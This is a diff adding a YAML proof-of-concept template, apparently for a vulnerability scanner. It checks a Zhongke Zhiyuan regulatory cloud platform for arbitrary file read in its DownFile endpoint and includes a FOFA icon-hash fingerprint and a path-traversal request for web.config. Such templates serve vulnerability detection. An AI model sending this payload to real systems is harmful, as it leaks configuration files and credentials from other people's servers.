@@ -1,0 +1,16 @@
+id: poc-yaml-zkzy-downfile-anyfile-read
+info:
+  name: 中科智远科技-综合监管云平台 DownFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 综合监管云平台
+  fofa: icon_hash="-227059202"
+requests:
+- method: GET
+  path: /Download/DownFile?fileName=../web.config
+  expression: "status_code == 200 && \ncontains(body,\"<configuration>\") &&\ncontains(body,\"\
+    web.config\") &&\ncontains(headers,\"filename=\") &&\ncontains(content_type,\"\
+    application/octet-stream\")\n"
+variables: {}
+transport: http
